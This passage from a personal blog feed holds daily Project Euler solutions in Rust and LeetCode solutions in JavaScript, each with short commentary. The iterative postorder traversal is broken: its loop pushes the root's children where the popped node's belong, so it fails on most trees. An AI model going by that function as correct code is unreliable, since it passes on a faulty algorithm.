title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashSet;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> trangular: HashSet&lt;<span class="built_in">usize</span>&gt; = HashSet::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> pentagonal:HashSet&lt;<span class="built_in">usize</span>&gt; = HashSet::new();</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">165</span>..<span class="number">100000</span> &#123;</span><br><span class="line">        trangular.insert(i*(i+<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">        pentagonal.insert(i*(<span class="number">3</span>*i-<span class="number">1</span>)/<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">144</span>..<span class="number">100000</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = i*(<span class="number">2</span>*i-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> trangular.contains(&amp;tmp) &amp;&amp; pentagonal.contains(&amp;tmp) &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, tmp);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="146-LRU-Cache"><a href="#146-LRU-Cache" class="headerlink" title="146. LRU Cache"></a>146. LRU Cache</h3><p>Design and implement a data structure for <a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#LRU" target="_blank" rel="noopener">Least Recently Used (LRU) cache</a>. It should support the following operations: <code>get</code> and <code>put</code>.</p><p><code>get(key)</code> - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.<br><code>put(key, value)</code> - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.</p><p><strong>Follow up:</strong><br>Could you do both operations in <strong>O(1)</strong> time complexity?</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LRUCache cache = new LRUCache( 2 /* capacity */ );</span><br><span class="line"></span><br><span class="line">cache.put(1, 1);</span><br><span class="line">cache.put(2, 2);</span><br><span class="line">cache.get(1);       // returns 1</span><br><span class="line">cache.put(3, 3);    // evicts key 2</span><br><span class="line">cache.get(2);       // returns -1 (not found)</span><br><span class="line">cache.put(4, 4);    // evicts key 1</span><br><span class="line">cache.get(1);       // returns -1 (not found)</span><br><span class="line">cache.get(3);       // returns 3</span><br><span class="line">cache.get(4);       // returns 4</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>A map with count will be enough for this problem.</p><p>A list will be better, but I don&#39;t know it in js.</p><p>Leave it for later or... Maybe?</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; capacity</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> LRUCache = <span class="function"><span class="keyword">function</span>(<span class="params">capacity</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.cap = capacity;</span><br><span class="line">  <span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.container = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; key</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LRUCache.prototype.get = <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.cnt += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.container.has(key))&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="keyword">this</span>.container.get(key);</span><br><span class="line">    tmp[<span class="number">1</span>] = <span class="keyword">this</span>.cnt;</span><br><span class="line">    <span class="keyword">return</span> tmp[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; key</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; value</span></span><br><span class="line"><span class="comment"> * @return &#123;void&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LRUCache.prototype.put = <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.cnt += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">this</span>.container.set(key, [value, <span class="keyword">this</span>.cnt]);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.container.size &gt; <span class="keyword">this</span>.cap) &#123;</span><br><span class="line">    <span class="keyword">let</span> mn = <span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, val] <span class="keyword">of</span> <span class="keyword">this</span>.container) &#123;</span><br><span class="line">      <span class="keyword">if</span> (val[<span class="number">1</span>] &lt; mn) &#123;</span><br><span class="line">        mn = val[<span class="number">1</span>];</span><br><span class="line">        index = key;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.container.delete(index);</span><br><span class="line">    <span class="keyword">this</span>.container.set(key, [value, <span class="keyword">this</span>.cnt]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your LRUCache object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * var obj = Object.create(LRUCache).createNew(capacity)</span></span><br><span class="line"><span class="comment"> * var param_1 = obj.get(key)</span></span><br><span class="line"><span class="comment"> * obj.put(key,value)</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-02 Daily Challenge</title>
      <link href="/2019-02-02-Daily-Challenge/"/>
      <url>/2019-02-02-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Pentagon numbers</em> in <em>Rust</em> and <em>Binary Tree Postorder Traversal</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Pentagon-numbers"><a href="#Pentagon-numbers" class="headerlink" title="Pentagon numbers"></a>Pentagon numbers</h3><h3 id="Problem-44"><a href="#Problem-44" class="headerlink" title="Problem 44"></a>Problem 44</h3><p>Pentagonal numbers are generated by the formula, $P_n=n(3n−1)/2$. The first ten pentagonal numbers are:</p><p>1, 5, 12, 22, 35, 51, 70, 92, 117, 145, ...</p><p>It can be seen that$ P_4 + P_7 = 22 + 70 = 92 = P_8$. However, their difference, 70 − 22 = 48, is not pentagonal.</p><p>Find the pair of pentagonal numbers, $P_j$ and $P_k$, for which their sum and difference are pentagonal and$ D = |P_k − P_j|$ is minimized; what is the value of D?</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>$$P_n = \frac{n(3n-1)}{2}=\frac{(6n-1)^2-1}{24}​$$</p><p>if $P_k-P_j =P_x$ and  $P_k+P_j=P_y$ are both pentagonal numbers, so there comes</p><p>$$(6k-1)^2-(6j-1)^2=(6x-1)^2-1​$$</p><p>$$(6k-1)^2+(6j-1)^2=(6y-1)^2+1$$</p><p>$$2(6k-1)^2=(6x-1)^2+(6y-1)^2$$</p><p>OK I don&#39;t know how to use these,,,,,, so just...</p><p>Brute Force?</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::collections::HashSet;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> set: HashSet&lt;<span class="built_in">i64</span>&gt; = HashSet::new();</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> arr: [<span class="built_in">i64</span>; <span class="number">5000</span>] = [<span class="number">0</span>; <span class="number">5000</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">5001</span> &#123;</span><br><span class="line">        arr[i-<span class="number">1</span>] = (i*(<span class="number">3</span>*i-<span class="number">1</span>)/<span class="number">2</span>) <span class="keyword">as</span> <span class="built_in">i64</span>;</span><br><span class="line">        set.insert((i*(<span class="number">3</span>*i-<span class="number">1</span>)/<span class="number">2</span>) <span class="keyword">as</span> <span class="built_in">i64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> offset: <span class="built_in">usize</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> index: <span class="built_in">usize</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> found: <span class="built_in">bool</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> offset &lt; <span class="number">5000</span> &amp;&amp; !found &#123;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> index &lt; <span class="number">5000</span> - offset &amp;&amp; !found &#123;</span><br><span class="line">            <span class="keyword">if</span> set.contains(&amp;(arr[index]+arr[index+offset])) &amp;&amp; set.contains(&amp;(arr[index+offset]-arr[index])) &#123;</span><br><span class="line">                ans = arr[index+offset] - arr[index];</span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            index += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        offset += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="145-Binary-Tree-Postorder-Traversal"><a href="#145-Binary-Tree-Postorder-Traversal" class="headerlink" title="145. Binary Tree Postorder Traversal"></a>145. Binary Tree Postorder Traversal</h3><p>Given a binary tree, return the postorder traversal of its nodes&#39; values.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    /</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [3,2,1]</span><br></pre></td></tr></table></figure><p><strong>Follow up:</strong> Recursive solution is trivial, could you do it iteratively?</p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">const</span> postTravel = <span class="function">(<span class="params">root</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root === <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    postTravel(root.left);</span><br><span class="line">    postTravel(root.right);</span><br><span class="line">    ans.push(root.val);</span><br><span class="line">  &#125;;</span><br><span class="line">  postTravel(root);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>non-recursive implementation</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;TreeNode&#125; root</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> postorderTraversal = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> [];</span><br><span class="line">  <span class="keyword">let</span> ans = [root.val];</span><br><span class="line">  <span class="keyword">let</span> s = [];</span><br><span class="line">  s.push(root.left);</span><br><span class="line">  s.push(root.right);</span><br><span class="line">  <span class="keyword">while</span> (s.length) &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = s.pop();</span><br><span class="line">    <span class="keyword">if</span> (tmp === <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line">    ans.unshift(tmp.val);</span><br><span class="line">    s.push(root.left);</span><br><span class="line">    s.push(root.right);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019-02-01 Daily Challenge</title>
      <link href="/2019-02-01-Daily-Challenge/"/>
      <url>/2019-02-01-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Sub-string divisibility</em> in <em>Rust</em> and <em>Numbers With Same Consecutive Differences</em> in <em>JavaScript</em>.</p><p>I also spent a few hours at Vidar Team&#39;s HGAME2019, and go through Crypto and Web Challenge.</p><p>Misc is boring, RE is boring too, PWN is interesting, but DotA2 is more interesting ;D</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><h3 id="Sub-string-divisibility"><a href="#Sub-string-divisibility" class="headerlink" title="Sub-string divisibility"></a>Sub-string divisibility</h3><h3 id="Problem-43"><a href="#Problem-43" class="headerlink" title="Problem 43"></a>Problem 43</h3><p>The number, 1406357289, is a 0 to 9 pandigital number because it is made up of each of the digits 0 to 9 in some order, but it also has a rather interesting sub-string divisibility property.</p><p>Let <em>d</em>1 be the 1st digit, <em>d</em>2 be the 2nd digit, and so on. In this way, we note the following:</p><ul><li><em>d</em>2<em>d</em>3<em>d</em>4=406 is divisible by 2</li><li><em>d</em>3<em>d</em>4<em>d</em>5=063 is divisible by 3</li><li><em>d</em>4<em>d</em>5<em>d</em>6=635 is divisible by 5</li><li><em>d</em>5<em>d</em>6<em>d</em>7=357 is divisible by 7</li><li><em>d</em>6<em>d</em>7<em>d</em>8=572 is divisible by 11</li><li><em>d</em>7<em>d</em>8<em>d</em>9=728 is divisible by 13</li><li><em>d</em>8<em>d</em>9<em>d</em>10=289 is divisible by 17</li></ul><p>Find the sum of all 0 to 9 pandigital numbers with this property.</p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Nothing to say.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> permutohedron::heap_recursive;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> data: [<span class="built_in">i64</span>; <span class="number">10</span>] = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line">    <span class="keyword">let</span> primes: [<span class="built_in">i64</span>; <span class="number">7</span>] = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> permutations = <span class="built_in">Vec</span>::new();</span><br><span class="line">    heap_recursive(&amp;<span class="keyword">mut</span> data, |permutation| &#123;</span><br><span class="line">        permutations.push(permutation.to_vec())</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">for</span> permutation <span class="keyword">in</span> permutations &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> is_ok = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">8</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> num(permutation[i], permutation[i+<span class="number">1</span>], permutation[i+<span class="number">2</span>]) % primes[i-<span class="number">1</span>] != <span class="number">0</span>&#123;</span><br><span class="line">                is_ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> is_ok &#123;</span><br><span class="line">            ans += numm(&amp;permutation);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">num</span></span>(i: <span class="built_in">i64</span>, j: <span class="built_in">i64</span>, k: <span class="built_in">i64</span>) -&gt; <span class="built_in">i64</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">100</span>*i+<span class="number">10</span>*j+k;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">numm</span></span>(vec: &amp;<span class="built_in">Vec</span>&lt;<span class="built_in">i64</span>&gt;) -&gt; <span class="built_in">i64</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> vec &#123;</span><br><span class="line">        ans *= <span class="number">10</span>;</span><br><span class="line">        ans += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><h3 id="967-Numbers-With-Same-Consecutive-Differences"><a href="#967-Numbers-With-Same-Consecutive-Differences" class="headerlink" title="967. Numbers With Same Consecutive Differences"></a>967. Numbers With Same Consecutive Differences</h3><p>Return all <strong>non-negative</strong> integers of length <code>N</code> such that the absolute difference between every two consecutive digits is <code>K</code>.</p><p>Note that <strong>every</strong> number in the answer <strong>must not</strong> have leading zeros <strong>except</strong> for the number <code>0</code> itself. For example, <code>01</code> has one leading zero and is invalid, but <code>0</code> is valid.</p><p>You may return the answer in any order.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: N = 3, K = 7</span><br><span class="line">Output: [181,292,707,818,929]</span><br><span class="line">Explanation: Note that 070 is not a valid number, because it has leading zeroes.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: N = 2, K = 1</span><br><span class="line">Output: [10,12,21,23,32,34,43,45,54,56,65,67,76,78,87,89,98]</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ol><li><code>1 &lt;= N &lt;= 9</code></li><li><code>0 &lt;= K &lt;= 9</code></li></ol><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Simple BFS.</p><p>I write two implementation and they don&#39;t come up with enough difference on performance.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; N</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; K</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> numsSameConsecDiff = <span class="function"><span class="keyword">function</span>(<span class="params">N, K</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ans = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>];</span><br><span class="line">  <span class="keyword">if</span> (N === <span class="number">1</span>) &#123;</span><br><span class="line">    ans.push(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> cnt = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (cnt &lt; N) &#123;</span><br><span class="line">    cnt += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> sz = ans.length;</span><br><span class="line">    <span class="keyword">while</span> (sz) &#123;</span><br><span class="line">     sz -= <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">let</span> cur = ans.shift();</span><br><span class="line">     <span class="keyword">if</span> (cur%<span class="number">10</span> - K &gt;= <span class="number">0</span>) ans.push(cur*<span class="number">10</span> + cur%<span class="number">10</span> - K);</span><br><span class="line">     <span class="keyword">if</span> (K !== <span class="number">0</span> &amp;&amp; cur%<span class="number">10</span> + K &lt;= <span class="number">9</span>) ans.push(cur*<span class="number">10</span> + cur%<span class="number">10</span> + K);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(numsSameConsecDiff(2,1));</span></span><br><span class="line"><span class="comment">// console.log(numsSameConsecDiff(3,7));</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 